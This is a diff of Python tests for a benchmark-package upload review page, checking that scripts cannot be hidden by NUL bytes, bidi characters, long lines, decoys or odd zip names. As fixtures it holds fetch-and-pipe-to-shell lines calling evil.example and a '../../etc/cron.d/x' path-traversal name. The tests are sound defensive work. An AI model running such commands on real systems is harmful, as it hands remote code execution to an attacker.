@@ -248,22 +248,31 @@ class TestStageReviewConfirm(UploadBase):
         self.assertNotIn('not https', second)
         self.assertIn('ab' * 32, second)
         # binary flagged, hints labelled as hints
-        self.assertIn('binary, not previewable', page)
+        self.assertIn('NOT SHOWN: binary', page)
+        self.assertIn('accept_unreviewable', page)
         self.assertIn('downloads and pipes into a shell', page)
         self.assertIn('not a verdict', page)
 
-    def test_script_text_is_truncated_at_64kb_with_a_notice(self):
+    def test_a_script_too_large_to_show_in_full_blocks_confirmation(self):
+        # Phase 3 round 2: a partly shown script must never be confirmable (the old behaviour showed 64 KB and let you confirm)
         b = self.admin
-        body = ''.join('echo line %06d\n' % i for i in range(20000)).encode()          # about 300 KB
+        body = ''.join('echo line %06d\n' % i for i in range(20000)).encode()          # about 300 KB, over the 256 KB per-file limit
         sid = stage_id(stage(b, script_zip(body))[1])
         page = b.get(PAGE + '/review&id=' + sid)[2]
-        self.assertIn('Truncated: ', page)
-        self.assertIn('limited to 64 KB per file', page)
-        shown = re.search(r'<h4>install\.sh.*?<pre class="pr-pre">(.*?)</pre>', page, re.S).group(1)
-        self.assertLessEqual(len(shown), 66000)
-        self.assertIn('echo line 000000', shown)
-        self.assertNotIn('echo line 019999', page)
-        self.assertIn(hashlib.sha256(body).hexdigest()[:16], page)
+        self.assertIn('Too large to review completely here', page)
+        self.assertIn('NOT SHOWN: too large to show', page)
+        self.assertNotIn('name="reviewed"', page, 'no confirm form')
+        self.assertIn('cannot be confirmed here', page)
+        name = json.loads(srv_sh('cat %s%s/meta.json' % (STAGING, sid)))['name']
+        confirm(b, sid, reviewed=True)                                   # a hand-made POST is refused server-side too
+        self.assertIn('too large to review completely', flash_of(b, PAGE + '/review&id=' + sid))
+        self.assertFalse(stored('test', name, '1.0.0'))
+        # a script that fits is shown whole
+        ok = ''.join('echo line %06d\n' % i for i in range(15000)).encode()           # about 225 KB
+        sid2 = stage_id(stage(b, script_zip(ok))[1])
+        page2 = b.get(PAGE + '/review&id=' + sid2)[2]
+        self.assertIn('echo line 014999', page2)
+        self.assertIn('name="reviewed"', page2)
 
 
 class TestRejections(UploadBase):
@@ -288,6 +297,7 @@ class TestRejections(UploadBase):
         self.rejected(test_zip(extra=[('dup.txt', 'a'), ('dup.txt', 'b')]), 'same path twice', 'duplicate entries')
         self.rejected(test_zip(extra=[('big.sh', '#!/bin/sh\r\necho hi\r\n')]), 'CRLF', 'CRLF script')
         self.rejected(make_zip([('readme.txt', 'x')]), 'neither test-definition.xml nor suite-definition.xml', 'no definition')
+        self.rejected(make_zip([('f%d.txt' % i, 'x') for i in range(520)] + [('test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'})]), 'too many files', 'over 500 entries')
         self.rejected(make_zip([('test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'}), ('suite-definition.xml', '<x/>')]), 'both', 'both definitions')
         self.rejected(test_zip(extra=[('zeros.bin', b'\0' * (40 * 1024 * 1024))]), 'expands', 'zip bomb')
         self.rejected(test_zip(), 'is not valid', 'bad name', name='Bad Name!')
@@ -472,6 +482,273 @@ class TestLimitsExpiryAndIntegrity(UploadBase):
         stage(b, b'junk')
         self.assertEqual([f for f in srv_sh('ls -a %s' % REPO_DIR).split() if f.startswith('upload-')], [])
         self.assertEqual(staged_dirs(), [])
+
+
+class TestReviewShowsWhatClientsRun(UploadBase):
+    """Phase 3 round 2: the review must not be able to look complete while hiding what a client would execute."""
+
+    def review(self, z, **kw):
+        sid = stage_id(stage(self.admin, z, **kw)[1])
+        self.assertTrue(sid, 'the upload should have been staged: ' + flash_of(self.admin, UPLOAD))
+        return sid, self.admin.get(PAGE + '/review&id=' + sid)[2]
+
+    def test_a_nul_byte_cannot_hide_a_script(self):
+        script = b'#!/bin/sh\n# ' + b'A' * 200 + b'\0echo pwned > /tmp/x\nid\n'
+        sid, page = self.review(script_zip(script))
+        self.assertIn('install.sh', page.split('Scripts and definition files')[1])
+        self.assertIn('\\0echo pwned', page)
+        self.assertNotIn('NOT SHOWN: binary', page, 'a script is never classified as binary')
+        self.assertIn('name="reviewed"', page)
+
+    def test_invisible_bidi_and_control_characters_are_made_visible(self):
+        script = ('#!/bin/sh\necho a‮b​c﻿d⁦e⁩f\x07g\x7fh\n'.encode() + b'\xffraw\xfe\n')
+        # valid UTF-8 first
+        sid, page = self.review(script_zip(script.split(b'\xff')[0]))
+        for marker in ('&lt;U+202E&gt;', '&lt;U+200B&gt;', '&lt;U+FEFF&gt;', '&lt;U+2066&gt;', '&lt;U+2069&gt;', '&lt;U+0007&gt;', '&lt;U+007F&gt;'):
+            self.assertIn(marker, page, marker)
+        for raw in ('‮', '​', '﻿', '⁦', '\x07', '\x7f'):
+            self.assertNotIn(raw, page)
+        # not valid UTF-8: every odd byte is shown by value
+        sid2, page2 = self.review(script_zip(script))
+        self.assertIn('&lt;0xFF&gt;', page2)
+        self.assertIn('&lt;0xFE&gt;', page2)
+
+    def test_long_lines_wrap_instead_of_hiding_off_screen(self):
+        line = 'echo ' + 'x' * 20000 + ' && curl http://evil.example/p | sh'
+        sid, page = self.review(script_zip(('#!/bin/sh\n' + line + '\n').encode()))
+        self.assertIn('curl http://evil.example/p | sh', page, 'the payload at the end of a very long line is in the page')
+        css = urllib.request.urlopen(BASE + '/phoromatic.css', timeout=30).read().decode()
+        rule = re.search(r'div\.pr-page pre\.pr-pre \{([^}]*)\}', css).group(1)
+        self.assertIn('white-space: pre-wrap', rule)
+        self.assertIn('word-break: break-all', rule)
+
+    def test_non_canonical_entry_names_are_rejected_at_stage_time(self):
+        dl = '<?xml version="1.0"?><PhoronixTestSuite><Downloads><Package><URL>http://evil.example/a.bin</URL><FileName>a.bin</FileName></Package></Downloads></PhoronixTestSuite>'
+        before = len(audit(Action='upload_rejected'))
+        for name in ('./downloads.xml', '//downloads.xml', 'Downloads.xml', 'DOWNLOADS.XML', './results-definition.xml', 'sub//x.sh', './install.sh', 'a/./b.sh'):
+            with self.subTest(name):
+                z = make_zip([('test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'}), (name, dl)])
+                status, headers, _ = stage(self.admin, z)
+                self.assertIsNone(stage_id(headers), name)
+                self.assertIn('not in canonical form', flash_of(self.admin, UPLOAD), name)
+        z = make_zip([('./test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'})])
+        stage(self.admin, z)
+        self.assertIn('not in canonical form', flash_of(self.admin, UPLOAD))
+        self.assertEqual(staged_dirs(), [])
+        self.assertEqual(len(audit(Action='upload_rejected')), before + 9)
+
+    def test_a_backslash_zip_is_rewritten_and_both_hashes_are_recorded(self):
+        z = test_zip(extra=[('sub\\\\tool.sh', '#!/bin/sh\necho hi\n')])
+        name = uniq('bsl')
+        sid = stage_id(stage(self.admin, z, filename=name + '.zip')[1])
+        self.assertTrue(sid)
+        d = json.loads(audit(Name=name, Action='upload_staged')[0]['Detail'])
+        self.assertEqual(d['original_sha256'], hashlib.sha256(z).hexdigest())
+        self.assertNotEqual(d['rewritten_sha256'], d['original_sha256'])
+        self.assertIn('sub/tool.sh', self.admin.get(PAGE + '/review&id=' + sid)[2])
+
+    def test_decoy_scripts_cannot_starve_the_real_install_script(self):
+        evil = b'#!/bin/sh\ncurl -s http://evil.example/real-payload | sh\n'
+        decoys = [('a%02d.sh' % i, ''.join('echo decoy %d %d\n' % (i, j) for j in range(5500))) for i in range(40)]      # about 2.8 MB of scripts
+        sid, page = self.review(make_zip([('test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'}), ('install.sh', evil)] + decoys))
+        scripts_part = page.split('Scripts and definition files')[1]
+        self.assertIn('real-payload', scripts_part, 'install.sh is read first, whatever else is in the package')
+        self.assertLess(scripts_part.index('real-payload'), scripts_part.index('decoy 0 0') if 'decoy 0 0' in scripts_part else 10 ** 9)
+        self.assertIn('Too large to review completely here', page)
+        self.assertNotIn('name="reviewed"', page, 'with scripts left unshown the upload cannot be confirmed')
+        self.assertRegex(page, r'NOT SHOWN: preview budget used up')
+        # the same package with fewer decoys fits and is confirmable
+        few = decoys[:20]
+        sid2, page2 = self.review(make_zip([('test-definition.xml', TEST_XML % {'title': 't2', 'version': '1.0.0'}), ('install.sh', evil)] + few))
+        self.assertNotIn('Too large to review completely', page2)
+        self.assertIn('name="reviewed"', page2)
+
+    def test_lifecycle_scripts_are_listed_in_the_order_clients_run_them(self):
+        z = make_zip([('test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'}), ('zzz-helper.sh', '#!/bin/sh\necho helper-zzz\n'), ('post.sh', '#!/bin/sh\necho post-run\n'),
+                      ('install.sh', '#!/bin/sh\necho install-run\n'), ('pre.sh', '#!/bin/sh\necho pre-run\n'), ('notes.txt', 'just notes\n')])
+        sid, page = self.review(z)
+        part = page.split('Scripts and definition files')[1]
+        order = [part.index(x) for x in ('install-run', 'pre-run', 'post-run', 'helper-zzz')]
+        self.assertEqual(order, sorted(order))
+        self.assertLess(part.index('helper-zzz'), part.index('just notes'))
+
+    def test_other_text_files_are_shown_not_hidden_behind_a_text_label(self):
+        z = script_zip(b'#!/bin/sh\n. ./settings.cfg\nmake\n', extra=[('settings.cfg', 'RUN="curl http://evil.example/cfg | sh"\n'), ('Makefile', 'all:\n\techo build\n'),
+                                                                  ('fix.patch', '--- a\n+++ b\n+evil\n'), ('notes', 'extension-less text\n'), ('tool.php', '<?php echo "php-script";')])
+        sid, page = self.review(z)
+        for needle in ('RUN=&quot;curl http://evil.example/cfg | sh&quot;', 'echo build', '+evil', 'extension-less text', 'php-script'):
+            self.assertIn(needle, page, needle)
+        self.assertEqual(page.count('shown below'), len(re.findall(r'<td class="pr-wrap">[^<]*</td><td>[^<]*</td><td class="pr-wrap"><code>[0-9a-f]*</code></td><td>shown below</td>', page)))
+        self.assertIn('<details><summary>settings.cfg', page)
+        self.assertNotIn('NOT SHOWN', page)
+
+    def test_binary_files_need_the_second_checkbox_enforced_server_side(self):
+        b = self.admin
+        name = uniq('bin')
+        z = script_zip(b'#!/bin/sh\necho ok\n', extra=[('payload.bin', b'\x7fELF\0\0\0\x01binary'), ('big.txt', ''.join('line %d\n' % i for i in range(40000)))])
+        sid = stage_id(stage(b, z, filename=name + '.zip')[1])
+        page = b.get(PAGE + '/review&id=' + sid)[2]
+        self.assertIn('2 file(s) cannot be reviewed here', page)
+        self.assertIn('payload.bin', page)
+        self.assertIn('big.txt', page)
+        self.assertIn('name="accept_unreviewable"', page)
+        confirm(b, sid)                                                  # reviewed, but not the second box
+        self.assertIn('second box', flash_of(b, PAGE + '/review&id=' + sid))
+        self.assertFalse(stored('test', name, '1.0.0'))
+        self.assertEqual(staged_dirs(), [sid])
+        confirm(b, sid, extra={'accept_unreviewable': '1'})
+        self.assertTrue(stored('test', name, '1.0.0'))
+        d = json.loads(audit(Name=name, Action='upload_committed')[0]['Detail'])
+        self.assertEqual(sorted(d['accepted_unreviewable_files']), ['big.txt', 'payload.bin'])
+
+    def test_downloads_table_shows_the_saved_as_name_and_flags_odd_ones(self):
+        dl = ('<?xml version="1.0"?><PhoronixTestSuite><Downloads>'
+              '<Package><URL>https://ok.example/a.bin</URL><SHA256>' + 'cd' * 32 + '</SHA256><FileName>a.bin</FileName></Package>'
+              '<Package><URL>https://ok.example/b.bin</URL><SHA256>' + 'ef' * 32 + '</SHA256><FileName>../../etc/cron.d/x</FileName></Package>'
+              '</Downloads></PhoronixTestSuite>')
+        sid, page = self.review(script_zip(b'#!/bin/sh\necho ok\n', extra=[('downloads.xml', dl)]))
+        self.assertIn('Saved as', page)
+        rows = re.findall(r'<tr><td class="pr-wrap">https://ok\.example.*?</tr>', page)
+        self.assertEqual(len(rows), 2)
+        self.assertIn('a.bin', rows[0])
+        self.assertNotIn('path separator', rows[0])
+        self.assertIn('../../etc/cron.d/x', rows[1])
+        self.assertIn('path separator or ..', rows[1])
+
+    def test_hint_scanning_is_bounded(self):
+        evil = b'#!/bin/sh\n' + b'curl ' * 50000                          # 250 KB on one line: quadratic patterns would hang
+        t = time.time()
+        sid, page = self.review(script_zip(evil))
+        self.assertLess(time.time() - t, 20)
+        self.assertIn('not a verdict', page)
+
+    def test_derived_name_is_clean_and_shown(self):
+        sid = stage_id(stage(self.admin, test_zip(), filename='My Test (1).zip')[1])
+        page = self.admin.get(PAGE + '/review&id=' + sid)[2]
+        self.assertIn('<code>private/my-test-1-1.0.0</code>', page)
+
+
+class TestRaces(UploadBase):
+    def exec_race(self, funcs):
+        barrier = threading.Barrier(len(funcs))
+
+        def wrap(f):
+            def go():
+                barrier.wait()
+                return f()
+            return go
+        with concurrent.futures.ThreadPoolExecutor(len(funcs)) as ex:
+            return [x.result() for x in [ex.submit(wrap(f)) for f in funcs]]
+
+    def test_cancel_and_confirm_race_has_exactly_one_winner(self):
+        for rnd in range(6):
+            name = uniq('cc')
+            a, c = self.fresh_admin(), self.fresh_admin()
+            sid = stage_id(stage(a, test_zip(), filename=name + '.zip')[1])
+            sha = sha256_of_stage(sid)
+            ta, tc = a.token(PAGE + '/upload'), c.token(PAGE + '/upload')
+            self.exec_race([lambda: confirm(a, sid, sha=sha, token=ta),
+                            lambda: c.post(ACTION, {'action': 'cancel', 'stage_id': sid, 'token_submit': tc})])
+            committed = len(audit(Name=name, Action='upload_committed'))
+            cancelled = len(audit(Name=name, Action='upload_cancelled'))
+            self.assertEqual(committed + cancelled, 1, 'round %d: committed=%d cancelled=%d' % (rnd, committed, cancelled))
+            self.assertEqual(stored('test', name, '1.0.0'), committed == 1)
+            self.assertEqual(staged_dirs(), [])
+
+    def test_two_cancels_audit_once(self):
+        name = uniq('c2')
+        a, c = self.fresh_admin(), self.fresh_admin()
+        sid = stage_id(stage(a, test_zip(), filename=name + '.zip')[1])
+        ta, tc = a.token(PAGE + '/upload'), c.token(PAGE + '/upload')
+        self.exec_race([lambda: a.post(ACTION, {'action': 'cancel', 'stage_id': sid, 'token_submit': ta}), lambda: c.post(ACTION, {'action': 'cancel', 'stage_id': sid, 'token_submit': tc})])
+        self.assertEqual(len(audit(Name=name, Action='upload_cancelled')), 1)
+
+    def test_sweep_does_not_remove_a_stage_that_is_being_confirmed(self):
+        name = uniq('sw')
+        b = self.admin
+        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
+        srv_sh("sed -i 's/\"expires\":[0-9]*/\"expires\":1000/' %s%s/meta.json && mv %s%s/upload.zip %s%s/committing.zip" % ((STAGING, sid) * 3))   # a confirm is mid-flight
+        b.get(PAGE)
+        self.assertEqual(staged_dirs(), [sid], 'the sweep must leave a claimed stage alone')
+        self.assertEqual(audit(Name=name, Action='upload_expired'), [])
+        srv_sh('mv %s%s/committing.zip %s%s/upload.zip' % (STAGING, sid, STAGING, sid))
+        b.get(PAGE)
+        self.assertEqual(staged_dirs(), [])
+        self.assertEqual(len(audit(Name=name, Action='upload_expired')), 1)
+
+    def test_parallel_sweeps_expire_a_stage_once(self):
+        name = uniq('sw2')
+        sid = stage_id(stage(self.admin, test_zip(), filename=name + '.zip')[1])
+        srv_sh("sed -i 's/\"expires\":[0-9]*/\"expires\":1000/' %s%s/meta.json" % (STAGING, sid))
+        browsers = [self.fresh_admin() for _ in range(8)]
+        self.exec_race([(lambda x=x: x.get(PAGE)) for x in browsers])
+        self.assertEqual(len(audit(Name=name, Action='upload_expired')), 1)
+        self.assertEqual(staged_dirs(), [])
+
+    def test_parallel_stage_posts_cannot_exceed_the_per_user_cap(self):
+        browsers = [self.fresh_admin() for _ in range(10)]
+        toks = [x.token(UPLOAD) for x in browsers]
+        z = test_zip()
+        results = self.exec_race([(lambda i=i: stage_id(stage(browsers[i], z, token=toks[i])[1])) for i in range(10)])
+        self.assertEqual(len([r for r in results if r]), 5)
+        self.assertEqual(len(staged_dirs()), 5)
+
+    def test_parallel_stage_posts_cannot_exceed_the_total_cap(self):
+        users = [self.fresh_admin() for _ in range(2)] + [self.admin2() for _ in range(2)]
+        toks = [x.token(UPLOAD) for x in users]
+        big = test_zip(extra=[('blob.bin', random.Random(77).randbytes(int(4.5 * 1024 * 1024)))])
+        results = self.exec_race([(lambda i=i: stage_id(stage(users[i], big, token=toks[i])[1])) for i in range(4)] * 2)
+        total = sum(int(x) for x in (srv_sh("find %s -name upload.zip -printf '%%s\\n'" % STAGING).split() or ['0']))
+        self.assertLessEqual(total, 25 * 1024 * 1024)
+        self.assertLessEqual(len([r for r in results if r]), 5)
+
+
+class TestStaleStateAndMisc(UploadBase):
+    def test_overwrite_is_refused_when_the_existing_version_changed_since_review(self):
+        b = self.admin
+        name = uniq('stale')
+        old = test_zip(extra=[('a.txt', 'one')])
+        upload(self.msi, 'test', name, old)
+        sid = stage_id(stage(b, test_zip(extra=[('a.txt', 'two')]), filename=name + '.zip')[1])
+        self.assertIn('already exists', b.get(PAGE + '/review&id=' + sid)[2])
+        upload(self.msi, 'test', name, test_zip(extra=[('a.txt', 'three')]), overwrite=True)      # someone changes it meanwhile
+        confirm(b, sid, overwrite=True)
+        self.assertIn('changed since you reviewed', flash_of(b))
+        self.assertEqual(srv_sh('sha256sum %stests/%s/1.0.0.zip' % (REPO_DIR, name)).split()[0], hashlib.sha256(test_zip(extra=[('a.txt', 'three')])).hexdigest())
+        self.assertEqual([r for r in audit(Name=name, Action='upload_committed') if json.loads(r['Detail']).get('source') == 'web'], [])
+
+    def test_a_version_that_appears_after_review_is_not_silently_overwritten_or_refused_silently(self):
+        b = self.admin
+        name = uniq('late')
+        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
+        self.assertNotIn('name="overwrite"', b.get(PAGE + '/review&id=' + sid)[2])
+        upload(self.msi, 'test', name, test_zip(extra=[('x', 'y')]))
+        confirm(b, sid, overwrite=True)                                   # a crafted overwrite flag for something never reviewed
+        self.assertIn('changed since you reviewed', flash_of(b))
+        self.assertEqual(len([r for r in audit(Name=name, Action='upload_committed')]), 1, 'only the CLI upload')
+
+    def test_a_copied_meta_json_cannot_adopt_another_stage(self):
+        b = self.admin
+        s1 = stage_id(stage(b, test_zip())[1])
+        s2 = stage_id(stage(b, test_zip(title='Other'))[1])
+        srv_sh('cp %s%s/meta.json %s%s/meta.json' % (STAGING, s1, STAGING, s2))
+        self.assertIn('not found', b.get(PAGE + '/review&id=' + s2)[2])
+
+    def test_unparsed_bodies_are_not_reported_as_oversize(self):
+        port = os.environ.get('QC_PORT2')
+        if not port:
+            self.skipTest('no twin server')
+        b = Browser('http://127.0.0.1:%s' % port).login(USER, PASS)
+        tok = b.token(UPLOAD)
+        for ctype, body in (('application/json', b'{"action":"stage"}'), ('text/plain', b'hello')):
+            req = urllib.request.Request(b.base + ACTION, data=body, headers={'Content-Type': ctype})
+            try:
+                b.opener.open(req, timeout=30)
+            except urllib.error.HTTPError:
+                pass
+            flash = flash_of(b, UPLOAD)
+            self.assertNotIn('post_max_size', flash, ctype)
+            self.assertIn('nothing was changed', flash, ctype)
 
 
 class TestFailClosed(UploadBase):
